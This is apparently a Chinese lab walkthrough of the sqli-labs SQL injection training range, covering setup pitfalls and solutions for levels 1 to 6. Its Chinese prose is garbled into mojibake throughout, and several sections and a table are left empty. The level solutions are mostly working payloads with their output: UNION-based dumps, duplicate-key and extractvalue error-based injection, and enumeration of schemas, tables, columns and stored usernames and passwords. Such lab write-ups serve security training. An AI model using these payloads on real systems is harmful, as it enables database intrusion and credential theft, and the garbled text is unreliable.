# SQLæ³¨å…¥

# Â§1 SQLi-lab

[SQLI labs](https://github.com/Audi-1/sqli-labs)æ˜¯ä¸€ä¸ªåŸºäºPHPå’ŒMySQLçš„å¼€æºSQLæ³¨å…¥é¶åœºã€‚æœ¬èŠ‚ä»‹ç»å„ä¸ªå®‰è£…æµç¨‹å’Œå¸¸è¸©çš„å‘ã€‚

## Â§1.1



## Â§1.2 æ³¨æ„äº‹é¡¹

## 

### Â§1.2.1 `mysql`å’Œ`mysqli`

åœ¨åˆå§‹åŒ–æ•°æ®åº“æ—¶ï¼Œå³ä½¿å·²ç»å¯ç”¨äº†`php_mysql.dll`æ‰©å±•ï¼Œå¯èƒ½ä»ç„¶ä¼šé‡åˆ°æ‰¾ä¸åˆ°`mysql_connect()`çš„æŠ¥é”™ï¼š

```
PHP Fatal error: Uncaught Error: Call to undefined function mysql_connect()
```

æ ¹æ®[PHPå®˜æ–¹æ–‡æ¡£](https://www.php.net/manual/en/function.mysql-connect.php)ï¼Œä»PHP 5.5.0ç‰ˆæœ¬èµ·ï¼Œ`php_mysql.dll`æ‰©å±•å°†è¢«å¼ƒç”¨ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯`php_mysqli.dll`å’Œ`php_pdo_mysql.dll`ã€‚è€Œè¯¥é¶åœºä½¿ç”¨çš„å‡½æ•°å®šä¹‰äºè¢«å¼ƒç”¨çš„æ‰©å±•ä¸­ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ã€‚è¦ä¹ˆæŠŠæ‰€æœ‰`mysql_`å¼€å¤´çš„å‡½æ•°å…¨éƒ¨æ›¿æ¢æˆ`mysqli_`ï¼Œè¦ä¹ˆå›é€€åˆ°PHPæ—§ç‰ˆæœ¬ã€‚

### Â§1.2.2 é­”æ³•å¼•å·

PHPStudyåœ¨`php.ini`ä¸­é»˜è®¤å¼€å¯äº†é­”æ³•å¼•å·åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½å¯ä»¥åœ¨GET/POST/COOKIEä¸­çš„æ‰€æœ‰å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€`\0`NULLå­—ç¬¦ä¹‹å‰åŠ ä¸Šåæ–œæ è¿›è¡Œè½¬ä¹‰ã€‚è¯¥é¶åœºçš„payloadéƒ½åŸºäºè¿™äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå› æ­¤ä¸€å®šè¦å…³é—­è¯¥åŠŸèƒ½ã€‚

```ini
; Magic quotes for incoming GET/POST/Cookie data.
magic_quotes_gpc = Off
```

### Â§1.2.3 HackBaråç©ºæ ¼

ä¼—æ‰€å‘¨çŸ¥ï¼ŒSQLè¯­å¥çš„æ³¨é‡Šç¬¦`--`åé¢å¿…é¡»åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œæ‰èƒ½åæ¥æ³¨é‡Šæ–‡æœ¬ï¼Œå¦åˆ™è¯¥æ³¨é‡Šæ— æ•ˆï¼Œå¹¶å¼•èµ·æŠ¥é”™ã€‚è€ŒHackBarè¿™æ¬¾æµè§ˆå™¨æ’ä»¶å¥½æ­»ä¸æ­»çš„åæœ«å°¾ç©ºæ ¼ï¼Œå¯¼è‡´ä½ å¿…é¡»ç»™`GET`è¯·æ±‚çš„å‚æ•°åæ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªUrlEncodeç©ºæ ¼å­—ç¬¦`%20`æ‰è¡Œã€‚

### Â§1.2.4 Urlç¼–ç `+`è¢«æ›¿æ¢ä¸ºç©ºæ ¼

æ ¹æ®[è¿™ç¯‡StackOverflowé—®é¢˜ä¸‹çš„å›ç­”](https://stackoverflow.com/questions/1005676/does-a-in-a-url-scheme-host-path-represent-a-space)ï¼Œåœ¨å†å²ä¸Šï¼ŒUrlç¼–ç è§„åˆ™ç»å†äº†å¤šä¸ªä¸åŒçš„æ ‡å‡†ï¼š

- åœ¨[RFC-1738](https://www.ietf.org/rfc/rfc1738.txt)æ ‡å‡†ä¸­ï¼Œä¸ºé˜²æ­¢`&`ç­‰ç‰¹æ®Šå­—ç¬¦å¹²æ‰°å‚æ•°å€¼å¯¼è‡´äºŒä¹‰æ€§ï¼Œéœ€è¦å°†å…¶å‡†æ¢æˆ`%hh`å½¢å¼ã€‚ä½†æ˜¯è¯¥æ ‡å‡†æœ¬èº«æ²¡æœ‰æåˆ°å¦‚ä½•å¤„ç†`+`è¿™ä¸€å­—ç¬¦ã€‚[HTML 401](https://www.w3.org/TR/html401/)æ ‡å‡†çš„[Â§17.13.4 Form content types](https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4.1)ä¸€èŠ‚ä¸­è¿›è¡Œäº†è¡¥å……ï¼Œç‰¹åˆ«è¯´æ˜**ç©ºæ ¼è¢«ç¼–ç æˆ`+`**ã€‚

  > <center>application/x-www-form-urlencoded</center>
  >
  > This is the default content type. Forms submitted with this content type must be encoded as follows:
  > `x-www-form-urlencoded`æ˜¯é»˜è®¤ä½¿ç”¨çš„å†…å®¹æ ¼å¼ï¼Œä½¿ç”¨è¿™ç§æ ¼å¼æäº¤çš„å†…å®¹å¿…é¡»ç¬¦åˆä»¥ä¸‹ç¼–ç è§„åˆ™ï¼š
  >
  > 1. Control names and values are escaped. Space characters are replaced by `+`, and then reserved characters are escaped as described in `RFC1738`, section 2.2:...
  >    æ§åˆ¶å­—ç¬¦å¿…é¡»ç»è¿‡è½¬ä¹‰ã€‚**ç©ºæ ¼å­—ç¬¦åº”è¢«æ›¿æ¢ä¸º`+`**ï¼Œå…¶ä½™çš„ä¿ç•™å­—ç¬¦åº”æŒ‰ç…§`RFC1738`2.2èŠ‚çš„æ ‡å‡†è¿›è¡Œè½¬ä¹‰ï¼š...
  > 2. ...

- åœ¨[RFC-3986](https://www.rfc-editor.org/rfc/rfc3986#section-2.4)æ ‡å‡†ä¸­ï¼Œæ‰€æœ‰å¯èƒ½äº§ç”ŸäºŒä¹‰æ€§çš„å­—ç¬¦éƒ½å¿…é¡»è¢«å¼ºåˆ¶è½¬ä¹‰ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€‚

  > <center>2.4 When to Encode or Decode</center>
  >
  > When a URI is dereferenced, the components and subcomponents significant to the scheme-specific dereferencing process (if any) must be parsed and separated before the percent-encoded octets within those components can be safely decoded, as otherwise the data may be mistaken for component delimiters.
  > åœ¨è¯¥æ ‡å‡†è§„å®šçš„è§£ç æµç¨‹ä¸­ï¼Œå½“URIè¢«è§£ç æ—¶ï¼Œå¦‚æœå­˜åœ¨å¹²æ‰°è¯¥æµç¨‹çš„ç»„ä»¶ä¸å­ç»„ä»¶ï¼Œé‚£ä¹ˆè¿™äº›ç»„ä»¶ä¸å­ç»„ä»¶å¿…é¡»ç»è¿‡è½¬æ¢ï¼Œä»è€Œä¸çœŸæ­£çš„åˆ†éš”ç¬¦åŒºåˆ†å¼€æ¥ï¼Œç„¶åæ‰èƒ½ä¿è¯Urlç¼–ç ä¸ä¼šé€ æˆäºŒä¹‰æ€§ï¼Œå¦åˆ™è¿™äº›ç»„ä»¶ä¸å­ç»„ä»¶å¯èƒ½è¢«è¯¯è®¤ä¸ºæ˜¯ç»„ä»¶åˆ†å‰²ç¬¦ã€‚

æ ¹æ®PHPçš„å…³äº[è¶…å…¨å±€å˜é‡`$_GET[]`](https://www.php.net/manual/zh/reserved.variables.get.php)å’Œ[å‡½æ•°`urlencode()`](https://www.php.net/manual/zh/function.urldecode.php)çš„å®˜æ–¹æ–‡æ¡£ï¼Œ`$_GET[]` æ˜¯é€šè¿‡`urldecode()`ä¼ é€’çš„ï¼Œè€Œè¯¥å‡½æ•°æ‰§è¡Œçš„æ°å¥½æ˜¯`RFC-1738`æ ‡å‡†ï¼Œä¼šå°†`+`æ›¿æ¢ä¸ºç©ºæ ¼ã€‚å¦æœ‰`rawurldecode()`å‡½æ•°æ‰§è¡Œçš„æ˜¯`RFC-3986`æ ‡å‡†ã€‚

> <center>$_GET</center>
>
> æ³¨æ„:GETæ˜¯é€šè¿‡[urldecode()](https://www.php.net/manual/zh/function.urldecode.php)ä¼ é€’çš„ã€‚
>
> <center>urldecode()</center>
>
> è§£ç ç»™å‡ºçš„å·²ç¼–ç å­—ç¬¦ä¸²ä¸­çš„ä»»ä½• `%##`ã€‚åŠ å·ï¼ˆ`+`ï¼‰è¢«è§£ç æˆä¸€ä¸ªç©ºæ ¼å­—ç¬¦ã€‚
>
> <center>rawurldecode()</center>
>
> æ³¨æ„:`rawurldecode()`ä¸ä¼šæŠŠåŠ å·ï¼ˆ`+`ï¼‰è§£ç ä¸ºç©ºæ ¼ï¼Œè€Œ`urldecode()`å¯ä»¥ã€‚
>

### Â§1.2.5 SQLä¸­çš„`'`ä¸`''`

SQLä¸­çš„å­—ç¬¦ä¸²ä¸¤ä¾§å¯ä»¥ç”¨å•å¼•å·æˆ–åŒå¼•å·ã€‚å½“ä½¿ç”¨å•å¼•å·æ—¶ï¼Œå¦‚æœå­—ç¬¦ä¸²ä¸­è¿˜åŒ…å«å•å¼•å·ï¼Œå°±ä¼šå¼•èµ·äºŒä¹‰æ€§ï¼š

```sql
SELECT * FROM ... WHERE title='I'm a CTFer';
```

è¿™æ—¶ï¼Œæˆ‘ä»¬åº”è¯¥ç»™å­—ç¬¦ä¸²ä¸­çš„å•å¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œå˜æˆ`''`çš„å½¢å¼ï¼š

```sql
SELECT * FROM ... WHERE title='I''m a CTFer';
```

????????????????????[å››ç§æ–¹å¼](https://www.databasestar.com/sql-escape-single-quote/)

### Â§1.2.6 SQLçš„æ‹¬å·/å¼•å·åµŒå¥—

| å¤–å±‚\payload |      |      |      |      |      |
| ------------ | ---- | ---- | ---- | ---- | ---- |
|              |      |      |      |      |      |
| ''           |      |      |      |      |      |
| ""           |      |      |      |      |      |
| ''''         |      |      |      |      |      |
| """"         |      |      |      |      |      |
| ()           |      |      |      |      |      |
| ('')         |      |      |      |      |      |
| ("")         |      |      |      |      |      |
| '()'         |      |      |      |      |      |
| "()"         |      |      |      |      |      |
|              |      |      |      |      |      |

### Â§1.2.7 MySQLçš„`secure_file_priv`å‚æ•°

æ ¹æ®[å®˜æ–¹æ–‡æ¡£](en/server-system-variables.html#sysvar_secure_file_priv)ï¼Œ`secure_file_priv`æ˜¯ä¸€ä¸ªç³»ç»Ÿçº§çš„å…¨å±€å˜é‡ï¼Œè´Ÿè´£æ§åˆ¶SQLè¯­å¥ä¸æ–‡ä»¶ç³»ç»Ÿäº¤äº’çš„æƒé™ï¼š

> - `secure_file_priv`
>
>   `secure_file_priv` çš„å–å€¼æœ‰ä»¥ä¸‹æƒ…å½¢
>
>   - å¦‚æœä¸ºç©ºå­—ç¬¦ä¸²ï¼Œåˆ™è¯¥å˜é‡æ— æ•ˆï¼ˆå¯ä»¥ä»»æ„å¯¼å…¥å¯¼å‡ºï¼‰ï¼Œé£é™©å¾ˆé«˜ã€‚
>   - å¦‚æœä¸ºä¸€ä¸ªç›®å½•çš„è·¯å¾„ï¼Œåˆ™åªå…è®¸å‘è¯¥ç›®å½•å¯¼å…¥å¯¼å‡ºã€‚è¯¥ç›®å½•å¿…é¡»é¢„å…ˆå­˜åœ¨ï¼ŒMySQLä¸è´Ÿè´£åˆ›å»ºç›®å½•ã€‚
>   - å¦‚æœä¸º`NULL`ï¼Œåˆ™ç¦æ­¢æ‰€æœ‰å¯¼å…¥å¯¼å‡ºã€‚

è¿™ä¸€å˜é‡å½±å“`select ... into outfile/dumpfile`ã€`load_data()`ã€`load_file()`ç­‰å‡½æ•°ã€‚





## Â§1.3 é¢˜è§£

### Â§1.3.1 ç¬¬1å…³ ç»•è¿‡`''`

æˆ‘ä»¬ä»¥è¿™è¡Œä»£ç å…¥æ‰‹ï¼š

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

æ˜¾ç„¶ï¼Œ`$id`ä¸­è‹¥å«æœ‰å•å¼•å·ä¾¿å¯å®ç°é€ƒé€¸çš„æ•ˆæœï¼Œæ¯”å¦‚æœ€ç»å…¸çš„`1' or '1'='1`ã€‚

äº†è§£åï¼Œæˆ‘ä»¬å‡è£…ä¸çŸ¥é“æºä»£ç ï¼Œå¼€å§‹é€æ­¥æ„å»ºpayloadï¼ŒçŒœæµ‹è¯­å¥ç»“æ„ã€‚

é¦–å…ˆè¯•ä¸€ä¸‹æ­£å¸¸è¾“å…¥ï¼Œå‡æ­£å¸¸ï¼š

```sql
id=1		-- Login name: Dumb		Password: Dumb
id=2		-- Login name: Angelina	Password: I-kill-you
id=1000		-- Login name: 			Password:
```

å°è¯•å•å¼•å·ï¼ŒæŠ¥é”™ï¼›å°è¯•ä¸¤ä¸ªå•å¼•å·ï¼Œæ­£å¸¸ã€‚å¯ä»¥çŒœæµ‹è¯­å¥ä¸­è‚¯å®šåŒ…å«å•å¼•å·ã€‚åŒæ—¶`LIMIT`å‘Šè¯‰æˆ‘ä»¬æœ€å¤šè¾“å‡ºä¸€æ¡ç»“æœã€‚

```sql
id=1		-- Login name: Dumb		Password: Dumb
id=1'		-- You have an error in your SQL syntax; ... near ''1'' LIMIT 0,1' at line 1
id=1''		-- Login name: Dumb		Password: Dumb
```

çŸ¥é“è¯­å¥åŒ…å«å•å¼•å·åï¼Œæˆ‘ä»¬å°±å¯ä»¥çŒœæµ‹è¯­å¥å¤§æ¦‚å¦‚ä¸‹æ‰€ç¤ºï¼š

```sql
SELECT ? FROM ? WHERE ?='$id' LIMIT 0,1 ? ;
```

æ¥ä¸‹æ¥ä½¿ç”¨`ORDER BY`çˆ†åˆ—æ•°ï¼ŒåŒæ—¶ä½¿ç”¨`--`æ³¨é‡Šæ‰`LIMIT`è¯­å¥ï¼Œå¾—åˆ°åˆ—æ•°ä¸º3ï¼š

```sql
id=1 ORDER BY 1 --  (ä¸€å®šè¦åœ¨--åé¢åŠ ç©ºæ ¼,æ‰èƒ½è¯†åˆ«ä¸ºæœ‰æ•ˆçš„æ³¨é‡Š)
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 1 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 1;
			-- Login name: Dumb		Password: Dumb
id=1â€˜ ORDER BY 2 -- 
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 2 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 2;
			-- Login name: Dumb		Password: Dumb
id=1â€˜ ORDER BY 3 -- 
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 3 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 3;
			-- Login name: Dumb		Password: Dumb
id=1â€˜ ORDER BY 4 -- 
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 4 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 4;
			-- Unknown column '4' in 'order clause'
```

åˆ©ç”¨`SELECT 1,2,3`å»ºä¸€å¼ åˆ—æ•°åŒæ ·ä¸º3çš„æ–°è¡¨ï¼Œä½¿ç”¨`UNION`è¯­å¥çˆ†å­—æ®µä¸åˆ—åºçš„å…³ç³»ã€‚è™½ç„¶æ³¨é‡Šäº†`LIMIT`ï¼Œä½†æ˜¯å‰ç«¯å§‹ç»ˆåªæ˜¾ç¤ºä¸€æ¡è®°å½•ï¼Œå› æ­¤æˆ‘ä»¬è¿˜è¦åœ¨`WHERE`ä¸­è®¾ç½®ä¸€ä¸ªè‡ªç›¸çŸ›ç›¾çš„æ¡ä»¶ï¼Œæ¥æŠŠæ­£å¸¸çš„é‚£æ¡è®°å½•ç»™å¹²æ‰ï¼Œåªç•™ä¸‹æˆ‘ä»¬çš„åˆ›å»ºçš„æ–°è¡¨ï¼š

```sql
id=1' union select 1,2,3 -- 
=> SELECT * FROM users WHERE id='1' union select 1,2,3 -- ' LIMIT 0,1
			+----+----------+----------+
			| id | ???????? | ???????? |
			+----+----------+----------+
			|  1 | Dumb     | Dumb     |
			|  1 | 2        | 3        |
			+----+----------+----------+
			-- Login name: Dumb		Password: Dumb
id=2' and 1=2 union select 1,2,3 -- 
=> SELECT * FROM users WHERE id='2' and 1=2 union select 1,2,3 -- ' LIMIT 0,1
			+----+----------+----------+
			| id | ???????? | ???????? |
			+----+----------+----------+
			|  1 | 2        | 3        |
			+----+----------+----------+
			-- Login name: 2		Password: 3
			å¯çŸ¥ç¬¬äºŒåˆ—ä¸ç”¨æˆ·åç›¸å…³,ç¬¬ä¸‰åˆ—ä¸å¯†ç ç›¸å…³
```

ç”¨`database()`å‡½æ•°çˆ†å½“å‰SQLè¯­å¥æ‰§è¡Œçš„æ•°æ®åº“åï¼š

```sql
id=1' AND 1=2 UNION SELECT 1,DATABASE(),3 --+
=> SELECT * FROM users WHERE id='1' AND 1=2 UNION SELECT 1,DATABASE(),3 -- ' LIMIT 0,1
			-- Login name: security	Password: 3
			å¯çŸ¥å½“å‰æ•°æ®åº“åä¸ºsecurity
```

ç”¨`information_schema`æ•°æ®åº“ä¸­çš„`schemata`è¡¨çˆ†æ‰€æœ‰æ•°æ®åº“åï¼Œæœç„¶å­˜åœ¨ä¹‹å‰çˆ†å‡ºçš„`security`ï¼š

```sql
id=1' AND 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 -- 
=> SELECT * FROM users WHERE id='1' AND 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 -- ' LIMIT 0,1
			+----+----------------------------------------------------------------------+----------+
			| id | ????????                                                             | ???????? |
			+----+----------------------------------------------------------------------+----------+
			|  1 | information_schema,challenges,mysql,performance_schema,security,test | 3        |
			+----+----------------------------------------------------------------------+----------+
			-- Login name: information_schema,challenges,mysql,performance_schema,security,test		Password: 
```

ç”¨`information_schema`æ•°æ®åº“ä¸­çš„`tables`è¡¨çˆ†`security`æ•°æ®åº“çš„æ‰€æœ‰è¡¨åï¼š

```sql
id=1' AND 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 -- 
=> SELECT * FROM users WHERE id='1' AND 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 -- ' LIMIT 0,1
			-- Login name: emails,referers,uagents,users	-- Password: 3
```

çŒœæµ‹`users`è¡¨å­˜æ”¾ç€ç”¨æˆ·æ•°æ®ã€‚ç”¨`information_schema`æ•°æ®åº“ä¸­çš„`columns`è¡¨ï¼Œçˆ†`security`æ•°æ®åº“ä¸­`users`è¡¨çš„æ‰€æœ‰åˆ—åï¼š

```sql
id=1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'),3 --+
=> SELECT * FROM users WHERE id='1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'),3 -- ' LIMIT 0,1
			-- Login name: id,username,password		-Password: 3
```

æ ¹æ®åˆ—åçˆ†å…¨è¡¨ï¼š

```sql
id=1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(username) FROM security.users),(SELECT GROUP_CONCAT(password) FROM security.users) --+
SELECT * FROM users WHERE id='1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(username) FROM security.users),(SELECT GROUP_CONCAT(password) FROM security.users) -- ' LIMIT 0,1
			-- Login name: Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
			-- Password: Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```

### Â§1.3.2 ç¬¬2å…³ ä¸ç»•è¿‡

å…ˆæŒ‰æ­£å¸¸æµç¨‹è¯•ä¸€éï¼š

- `id=1`ï¼Œæ­£å¸¸
- `id=1'`ï¼ŒæŠ¥é”™ï¼Œ`Wrong syntax near '' LIMIT 0,1' at line 1`
- `id=1''`ï¼ŒæŠ¥é”™ï¼Œ`Wrong syntax near ''' LIMIT 0,1' at line 1`

è‡³æ­¤å¯æ¨æ–­ï¼ŒSQLè¯­å¥è‚¯å®šæ²¡æœ‰å½¢å¦‚`'id'`çš„éƒ¨åˆ†ï¼Œè€Œæ˜¯ç›´æ¥å°†`id`æš´éœ²åœ¨å¤–ã€‚åªéœ€å°†ç¬¬1å…³ä¸­çš„payloadä»`id=1'`æ”¹ä¸º`id=1`å³å¯ï¼Œå…¶ä½™æ­¥éª¤åŒä¸Šã€‚

### Â§1.3.3 ç¬¬3å…³ ç»•è¿‡`('')`

å…ˆæŒ‰æ­£å¸¸æµç¨‹è¯•ä¸€éï¼š

- `id=1`ï¼Œæ­£å¸¸
- `id=1'`ï¼ŒæŠ¥é”™ï¼Œ`Wrong syntax near ''1'') LIMIT 0,1' at line 1`
- `id=1''`ï¼Œæ­£å¸¸

å› ä¸ºä¸¤ä¸ªå•å¼•å·æ­£å¸¸ï¼Œæ‰€ä»¥ä¸€å®šæœ‰``''`ã€‚å®¹æ˜“å‘ç°ï¼Œç›¸æ¯”ä¸ç¬¬2å…³ï¼Œå•å¼•å·æŠ¥é”™å¤šäº†ä¸€ä¸ªå³æ‹¬å·ã€‚å°†`1'`çœ‹ä½œä¸€ä¸ªæ•´ä½“ï¼ŒæŠ¥é”™ä¿¡æ¯ç»™å‡ºçš„éƒ¨åˆ†è¯­å¥å½¢å¦‚`'$id') LIMIT 0,1`ï¼Œç«‹å³å¯ä»¥æ¨æµ‹å‡ºè¯­å¥ä¸º`WHERE ?=('$id')`ã€‚åªéœ€å°†ç¬¬1å…³ä¸­çš„payloadä»`id=1'`æ”¹ä¸º`id=1')`å³å¯ï¼Œå…¶ä½™æ­¥éª¤åŒä¸Šã€‚

### Â§1.3.4 ç¬¬4å…³ ç»•è¿‡`("")`

å…ˆæŒ‰æ­£å¸¸æµç¨‹è¯•ä¸€éï¼š

- `id=1`ï¼Œæ­£å¸¸
- `id=1'`ï¼Œæ­£å¸¸
- `id=1''`ï¼Œæ­£å¸¸

å†è¯•ä¸€ä¸‹åŒå¼•å·ï¼š

- `id=1"`ï¼šæŠ¥é”™ï¼Œ`Wrong syntax to use near '"1"") LIMIT 0,1' at line 1`
-  `id=1""`ï¼šæ­£å¸¸

ç±»æ¯”äºç¬¬3å…³ï¼ŒæŠ¥é”™ä¿¡æ¯ç»™å‡ºçš„éƒ¨åˆ†è¯­å¥å½¢å¦‚`"$id") LIMIT 0,1`ã€‚åªéœ€å°†ç¬¬1å…³ä¸­çš„payloadä»`id=1'`æ”¹ä¸º`id=1")`å³å¯ï¼Œå…¶ä½™æ­¥éª¤åŒä¸Šã€‚

### Â§1.3.5 ç¬¬5å…³ æŠ¥é”™æ³¨å…¥ï¼ˆç»•è¿‡`''`ï¼‰

æŠ¥é”™æœ‰å›æ˜¾å…ˆæŒ‰æ­£å¸¸æµç¨‹è¯•ä¸€éï¼š

- `id=1`ï¼Œæ­£å¸¸
- `id=1'`ï¼ŒæŠ¥é”™ï¼Œ`Wrong syntax to use near ''1'' LIMIT 0,1' at line 1`
- `id=1' --+`ï¼Œæ­£å¸¸
- `id=1"`ï¼Œæ­£å¸¸

æ®æ­¤å¯æ¨æµ‹ï¼ŒSQLè¯­å¥å½¢å¦‚`'$id' LIMIT 0,1`ã€‚

`ORDER BY`çˆ†åˆ—æ•°ä¸º3ï¼š

```sql
id=1' ORDER BY 3 --+
=> SELECT ? FROM ? WHERE ID='1' ORDER BY 3 -- ' LIMIT 0,1
		# You are in...........
id=1' ORDER BY 4 --+
=> SELECT ? FROM ? WHERE ID='1' ORDER BY 4 -- ' LIMIT 0,1
		# Unknown column '4' in 'order clause'
```

å°è¯•`SELECT`çˆ†å­—æ®µä¸åˆ—åºçš„å…³ç³»ï¼Œç»“æœæœªè¿”å›ä»»ä½•ä¸€ä¸ªæœŸæœ›å€¼ï¼Œè¿™è¯´æ˜è¿”å›å€¼ä¸æ•°æ®åº“æ— å…³ï¼Œæ˜¯ä¸€ä¸ªå†™æ­»çš„å€¼ï¼š

```sql
id=1â€™ and 1=2 union select 1,2,3 --+
		# You are in...........	(ä¸æ˜¯1,2,3ç§çš„ä»»ä½•ä¸€ä¸ª)
```

è¿™ç§æƒ…å†µä¸‹ï¼Œè¾“å‡ºæ­£å¸¸åªèƒ½å‘Šè¯‰æˆ‘ä»¬è¯­å¥æ‰§è¡ŒæˆåŠŸï¼Œä¸èƒ½è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œåªèƒ½é€šè¿‡è¾“å‡ºæŠ¥é”™äº†ã€‚

1. è§£æ³•ä¸€ åŒæŸ¥è¯¢æ³¨å…¥

   ä»¥ä¸‹æ­¥éª¤çš„åŸç†è¯¦è§[Â§3.1.1 ä¸»é”®é‡å¤æ³¨å…¥](#Â§3.1.1 ä¸»é”®é‡å¤æ³¨å…¥)ä¸€èŠ‚ã€‚

   çˆ†æ•°æ®åº“åï¼š

   ```sql
   id=1' union select 1,count(*), concat((select database()), floor(rand(14)*2))as a from information_schema.tables group by a --+
   	Duplicate entry 'security0' for key 'group_key' # æˆ‘ä»¬æ„å»ºçš„æ¶æ„payload:database()å¾—åˆ°äº†æ‰§è¡Œ.
   ```

   çˆ†è¡¨åï¼š

   ```sql
   ?id=1' union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	Duplicate entry 'emails1' for key 'group_key'
   
   ?id=1' union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 1,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	Duplicate entry 'referers1' for key 'group_key'
   
   ?id=1' union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 2,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	Duplicate entry 'uagents1' for key 'group_key'
   
   ?id=1' union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	Duplicate entry 'users1' for key 'group_key'
   
   ?id=1' union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 4,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	The used SELECT statements have a different number of columns
   ```

   çˆ†åˆ—åï¼š

   ```sql
   ?id=1' union select 1 from (select count(*),concat((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 0,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	Duplicate entry 'id1' for key 'group_key' # åˆ—åä¸ºid
   
   ?id=1' union select 1 from (select count(*),concat((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 1,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	Duplicate entry 'username1' for key 'group_key' # åˆ—åä¸ºusername
   	
   ?id=1' union select 1 from (select count(*),concat((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 2,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
       Duplicate entry 'password1' for key 'group_key' # åˆ—åä¸ºpassword
       
   ?id=1' union select 1 from (select count(*),concat((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 3,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
       The used SELECT statements have a different number of columns # æœªæŠ¥é”™ï¼Œè¯´æ˜å­æŸ¥è¯¢è¿”å›äº†ç©ºè¡¨ï¼Œè¯´æ˜åˆ—åå·²ç»çˆ†å®Œ
   ```

   çˆ†æ•°æ®ï¼š

   ```sql
   ?id=1' union select 1 from (select count(*),concat((SELECT username FROM users LIMIT 0,1),floor(rand(0)*2))x from users group by x)y --+
   	Duplicate entry 'Dumb1' for key 'group_key'
   ```

2. è§£æ³•äºŒ XPathæ³¨å…¥

   ä»¥ä¸‹æ­¥éª¤çš„åŸç†è¯¦è§[3.1.2 XPathæ³¨å…¥](#3.1.2 XPathæ³¨å…¥)ã€‚

   çˆ†æ•°æ®åº“åï¼š

   ```sql
   payload = ?id=1' and extractvalue('',concat(0x30,(select database())))--+
   	XPATH syntax error: 'security'
   ```

   çˆ†è¡¨åï¼š

   ```sql
   payload = ?id=0' and extractvalue(0x0a,concat(0x30,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+
   	XPATH syntax error: 'emails,referers,uagents,users'
   ```

   çˆ†åˆ—åï¼š

   ```sql
   payload = ?id=0' and extractvalue(0x0a,concat(0x0a,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'))) --+
   	XPATH syntax error: 'id,username,password'
   ```

   çˆ†è®°å½•ï¼š

   ```sql
   payload = ?id=0' and extractvalue(0x0a,concat(0x0a,(SELECT GROUP_CONCAT(username) FROM users ))) --+
   	XPATH syntax error: 'Dumb,Angelina,Dummy,secure,stup' (32å­—ç¬¦é™åˆ¶)
   ```

### Â§1.3.6 ç¬¬6å…³ æŠ¥é”™æ³¨å…¥ï¼ˆç»•è¿‡`""`ï¼‰

ç»è¿‡ç®€å•æµ‹è¯•å¯çŸ¥å‚æ•°ç”±ä¸€å±‚åŒå¼•å·åŒ…å›´ï¼Œæ— æˆåŠŸå›æ˜¾ï¼Œæœ‰æŠ¥é”™å›æ˜¾ï¼Œå‰©ä½™æ­¥éª¤ä¸ç¬¬5å…³ä¸€æ ·ã€‚

### Â§1.3.7 ç¬¬7å…³ å¯¼å‡ºæ•°æ®åº“

